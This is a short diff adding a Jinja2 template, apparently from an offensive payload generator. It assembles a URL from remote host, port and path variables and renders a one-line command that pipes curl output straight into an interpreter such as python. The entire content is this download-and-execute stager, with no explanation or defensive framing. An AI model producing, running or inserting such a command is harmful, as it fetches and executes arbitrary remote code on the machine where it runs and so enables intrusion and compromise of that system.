@@ -1,0 +1,7 @@
+{% set interpreter =
+    interpreter if interpreter.startswith('python') else interpreter %}
+{% set url = 'http://{}{}{}'.format(
+    rhost, ':{}'.format(rport) if rport != 80 else '', path) %}
+
+curl {{ url }} | {{ interpreter }}
+
